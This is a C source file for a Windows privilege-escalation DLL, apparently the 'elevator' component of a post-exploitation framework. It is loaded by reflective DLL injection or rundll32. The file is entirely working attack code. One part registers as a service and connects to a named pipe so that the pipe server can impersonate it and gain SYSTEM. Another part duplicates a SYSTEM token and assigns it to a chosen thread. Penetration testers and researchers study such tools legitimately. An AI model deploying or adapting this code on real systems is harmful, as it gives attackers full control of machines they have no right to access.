//
// Note: To use the produced x86 dll on NT4 you must manually edit the PE Header (CFF Explorer[1] is good) in order
//       to change the MajorOperatingSystemVersion and MajorSubsystemVersion to 4 instead of 5 as Visual C++ 2008
//       can't build PE images for NT4 (only 2000 and up). The modified dll will then work on NT4 and up. This does
//       not apply to the produced x64 dll.
//
// [1] http://www.ntcore.com/exsuite.php
//

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "elevator.h"

// define this as we are going to be injected via LoadRemoteLibraryR
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR

// define this as we want to use our own DllMain function
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

// Simple macro to close a handle and set the handle to NULL.
#define CLOSE_HANDLE( h )	if( h ) { CloseHandle( h ); h = NULL; }

LPSTR lpServiceName                = NULL;
DWORD dwElevateStatus              = 0;
SERVICE_STATUS          status     = {0}; 
SERVICE_STATUS_HANDLE   hStatus    = NULL; 
HANDLE                  hTerminate = NULL;

BOOL elevator_servicestatus( DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint )
{
	BOOL bSuccess             = FALSE;
    static DWORD dwCheckPoint = 1;

	do
	{
		if( !hStatus )
			break;

		status.dwCurrentState = dwCurrentState;
		status.dwWin32ExitCode = dwWin32ExitCode;
		status.dwWaitHint = dwWaitHint;

		if( dwCurrentState == SERVICE_START_PENDING )
			status.dwControlsAccepted = 0;
		else
			status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

		if( ( dwCurrentState == SERVICE_RUNNING ) || ( dwCurrentState == SERVICE_STOPPED ) )
			status.dwCheckPoint = 0;
		else
			status.dwCheckPoint = dwCheckPoint++;

		bSuccess = SetServiceStatus( hStatus, &status );

	} while( 0 );

	return bSuccess;
}

void elevator_servicectrl( DWORD dwCode ) { }

/*
 * The main service routine, which we use to connect a named pipe server before finishing.
 */
VOID elevator_serviceproc( DWORD argc, LPSTR * argv )
{
	DWORD dwResult              = ERROR_SUCCESS;
	HANDLE hPipe                = NULL;
	char cServicePipe[MAX_PATH] = {0};
	DWORD dwBytes               = 0;
	BYTE bByte                  = 0;

	do
	{

		hStatus = RegisterServiceCtrlHandler( lpServiceName, (LPHANDLER_FUNCTION)elevator_servicectrl );
		if( !hStatus )
			BREAK_ON_ERROR( "[ELAVATOR] elevator_service_proc. RegisterServiceCtrlHandler failed" );
		  
		status.dwServiceType             = SERVICE_WIN32_OWN_PROCESS; 
		status.dwServiceSpecificExitCode = 0;
		
		elevator_servicestatus( SERVICE_RUNNING, NO_ERROR, 0 );

		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", lpServiceName );

		while( TRUE )
		{
			hPipe = CreateFileA( cServicePipe, GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
			if( hPipe )
			{
				if( WriteFile( hPipe, &bByte, 1, &dwBytes, NULL ) )
					break;

				CLOSE_HANDLE( hPipe );
			}

			Sleep( 50 );
		}

	} while( 0 );

	CLOSE_HANDLE( hPipe );

	dwElevateStatus = dwResult;

	elevator_servicestatus( SERVICE_STOPPED, NO_ERROR, 0 );
	
	SetEvent( hTerminate );
}

/*
 * Elevate a pipe server by allowing it to impersonate us.
 */
BOOL elevator_pipe( char * cpServiceName )
{
	DWORD dwResult                      = ERROR_SUCCESS;
	SERVICE_TABLE_ENTRY servicetable[2] = {0};

	do
	{
		if( !cpServiceName )
			BREAK_WITH_ERROR( "[ELEVATOR] elevator_pipe. cpServiceName == NULL", ERROR_INVALID_HANDLE );
		
		lpServiceName = _strdup( cpServiceName );
	
		hTerminate = CreateEvent( 0, TRUE, FALSE, 0 );
		if( !hTerminate )
			BREAK_ON_ERROR( "[ELAVATOR] elevator_service_proc. CreateEvent hTerminate failed" );

		servicetable[0].lpServiceName = lpServiceName;
		servicetable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)elevator_serviceproc;

		servicetable[1].lpServiceName = NULL;
		servicetable[1].lpServiceProc = NULL;

		if( !StartServiceCtrlDispatcher( servicetable ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_pipe. StartServiceCtrlDispatcher failed" );

		if( WaitForSingleObject( hTerminate, INFINITE ) != WAIT_OBJECT_0 )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_pipe. WaitForSingleObject failed" );

		dwResult = dwElevateStatus;

	} while( 0 );
	
	CLOSE_HANDLE( hTerminate );

	return dwResult;
}

/*
 * Elevate the given thread with our current token if we are running under the required user.
 */
BOOL elevator_thread( DWORD dwThreadId, DWORD dwSecurityRID )
{
	DWORD dwResult                       = ERROR_SUCCESS;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	BOOL bIsSystem                       = FALSE;
	CHECKTOKENMEMBERSHIP pCheckTokenMembership = NULL;
	OPENTHREAD pOpenThread               = NULL;
	HANDLE hToken                        = NULL;
	HANDLE hProcessToken                 = NULL;
	HANDLE hThread                       = NULL;
	HANDLE hPipe                         = NULL;
	TOKEN_USER * lpTokenUser             = NULL;
	SID * lpSystemSID                    = NULL;
	char cServicePipe[MAX_PATH]          = {0};
	DWORD dwLength                       = 0;

	do
	{
		// dynamically resolve advapi32!CheckTokenMembership and kernel32!OpenThread as they are not present on NT4
		pCheckTokenMembership = (CHECKTOKENMEMBERSHIP)GetProcAddress( LoadLibrary( "advapi32" ), "CheckTokenMembership" );
		pOpenThread = (OPENTHREAD)GetProcAddress( LoadLibrary( "kernel32" ), "OpenThread" );
		if( !pCheckTokenMembership || !pOpenThread )
			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. pCheckTokenMembership/pOpenthread == 0", ERROR_INVALID_HANDLE );

		if( !dwThreadId )
			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. dwThreadId == 0", ERROR_INVALID_HANDLE );

		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &hProcessToken ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. OpenToken failed" );

		if( !AllocateAndInitializeSid( &NtAuthority, 1, dwSecurityRID, 0, 0, 0, 0, 0, 0, 0, &lpSystemSID ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. AllocateAndInitializeSid failed" );

		if( !DuplicateToken( hProcessToken, SecurityImpersonation, &hToken ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. DuplicateToken failed" );

		if( !pCheckTokenMembership( hToken, lpSystemSID, &bIsSystem ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. CheckTokenMembership failed" );

		if( !bIsSystem )
			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. bIsSystem == FALSE", ERROR_INVALID_SID );

		hThread = pOpenThread( THREAD_ALL_ACCESS, TRUE, dwThreadId );
		if( !hThread )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. OpenThread failed" );

		if( !SetThreadToken( &hThread, hToken ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. SetThreadToken failed" );

		dprintf( "[ELEVATOR] elevator_thread. Gave SYSTEM token to thread %d", dwThreadId );

	} while( 0 );

	CLOSE_HANDLE( hProcessToken );

	CLOSE_HANDLE( hToken );

	CLOSE_HANDLE( hThread );

	if( lpSystemSID )
		FreeSid( lpSystemSID ); 

	return dwResult;
}

/*
 * The real entrypoint for this app.
 */
VOID elevator_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		dprintf( "[ELEVATOR] elevator_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

		if( !cpCommandLine )
			break;

		if( strlen( cpCommandLine ) == 0 )
			break;
			
		dprintf( "[ELEVATOR] elevator_main. lpCmdLine=%s", cpCommandLine );
		
		if( strstr( cpCommandLine, "/t:" ) )
		{
			DWORD dwThreadId = 0;

			cpCommandLine += strlen( "/t:" );

			dwThreadId = atoi( cpCommandLine );

			dwResult = elevator_thread( dwThreadId, SECURITY_LOCAL_SYSTEM_RID );

			ExitThread( dwResult );
		}
		else if( strstr( cpCommandLine, "/p:" ) )
		{
			cpCommandLine += strlen( "/p:" );

			dwResult = elevator_pipe( cpCommandLine );
		}

	} while( 0 );
}

/*
 * rundll32.exe entry point.
 */
VOID DLLEXPORT CALLBACK a( HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int nCmdShow )
{
	elevator_main( lpszCmdLine );

	ExitProcess( ERROR_SUCCESS );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				elevator_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}

